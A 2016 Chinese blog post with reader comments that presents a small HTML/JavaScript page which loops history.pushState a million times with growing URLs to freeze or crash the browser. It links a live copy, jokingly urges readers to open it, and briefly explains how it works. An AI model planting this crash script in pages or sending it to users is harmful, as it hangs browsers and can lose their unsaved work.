+++
title = "如何将浏览器炸掉"
date = 2016-01-27

[extra.comments]
issue_id = 6

[[extra.comments.addition]]
user = { login = "David Colin", html_url = "https://www.xmu714.site", avatar_url = "https://secure.gravatar.com/avatar/98cc9fcd1382e7eba5ec9dfdcb97fed6?d=retro" }
created_at = "2017-07-31T07:47:29Z"
body = "刚用了博主的主题，有点意思"

[[extra.comments.addition]]
user = { login = "我来打酱油了", avatar_url = "https://secure.gravatar.com/avatar/?d=retro" }
created_at = "2018-11-13T07:37:37Z"
body = "可恶"

[[extra.comments.addition]]
user = { login = "啦啦啦", avatar_url = "https://secure.gravatar.com/avatar/?d=retro" }
created_at = "2020-03-23T12:02:18Z"
body = "怪不得备案信息那么猖狂，原来网站不在境内。封站警告[滑稽]"

[[extra.comments.addition]]
user = { login = "明年我开会员", avatar_url = "https://secure.gravatar.com/avatar/ef465e95972160bd6ea3bdce9e5f8d5c?d=retro" }
created_at = "2016-01-29T05:06:14Z"
body = "666"

[[extra.comments.addition]]
user = { login = "Space520", avatar_url = "https://secure.gravatar.com/avatar/1b936d729bf7f50c7a58961dfec6026e?d=retro" }
created_at = "2023-03-09T09:43:47Z"
body = "> 刚用了博主的主题，有点意思\n\nhello，你好。"

[[extra.comments.addition]]
user = { login = "Space520", avatar_url = "https://secure.gravatar.com/avatar/1b936d729bf7f50c7a58961dfec6026e?d=retro" }
created_at = "2023-03-04T06:18:38Z"
body = "666牛逼！"

[[extra.comments.addition]]
user = { login = "watermelon", html_url = "https://mowatermelon.github.io", avatar_url = "https://secure.gravatar.com/avatar/9e2261a1f5b9cca7fc32299dd9ba808e?d=retro" }
created_at = "2017-09-05T03:38:50Z"
body = "大ie       对象不支持“pushState”属性或方法"

[[extra.comments.addition]]
user = { login = "miko", avatar_url = "https://secure.gravatar.com/avatar/9ca79578003669fa05dad5fb5915d84b?d=retro" }
created_at = "2020-04-02T16:53:20Z"
body = "好奇心让我点了链接，，果然要重启浏览器😂"

[[extra.comments.addition]]
user = { login = "ortt", avatar_url = "https://secure.gravatar.com/avatar/867ae57702dd9d4ebd40b2977e63497e?d=retro" }
created_at = "2023-02-23T13:37:08Z"
body = "edge：浏览器并没有崩， 只是报错了 \n```sh\nUncaught DOMException: Failed to execute 'pushState' on 'History': A history state object with URL 'file:///C:/Users/username/Desktop/0' cannot be created in a document with origin 'null' and URL 'file:///C:/Users/username/Desktop/test.html'.\n    at file:///C:/Users/username/Desktop/test.html:11:17\n```"

[[extra.comments.addition]]
user = { login = "Shadow", avatar_url = "https://secure.gravatar.com/avatar/fc210811ce0caa54a69709287dd1e028?d=retro" }
created_at = "2018-05-20T14:41:07Z"
body = "出乱码惹（用的Safari）"
+++

如何将浏览器炸掉？

<!--more-->

你可以直接打开[这个链接](/various/browser-ripper.html)
或者，你也可以新建一个文件 `browser-ripper.html`，内容如下：

```html
<html>
  <head>
    <title>等待 10 秒，便可享受到飞一般的感觉</title>
  </head>
  <body>
    <h1>抓紧，要上天了！</h1>
    <script>
      var total = "";
      for (var i = 0; i<1000000; i++) {
        total = total + i.toString();
        history.pushState(0,0,total);
      }
    </script>
  </body>
</html>
```

然后用浏览器打开它

你真的打开它了😂？
是不是很爽？😂我们来看看原理

嗯...大家都能看出来这是一个 JS 循环，而重点就在于 `history.pushState` 这句。
而`history.pushState`是什么呢？
大家可能或多或少都听说过 pjax（没错，本博客就在用），而而 pjax 中的这个“p”在某种意义上代表的就是 `history.pushState`，这是现代浏览器普遍支持的一种添加浏览历史记录的方法。
是不是觉得豁然开朗？没错！这一段 JS 就是在向你的浏览器历史里塞进 1000000 条记录😂
（逃

***

本文参考了：
[Cyber Security 的 Tweet](https://twitter.com/cyber__sec/status/689070600653041664)
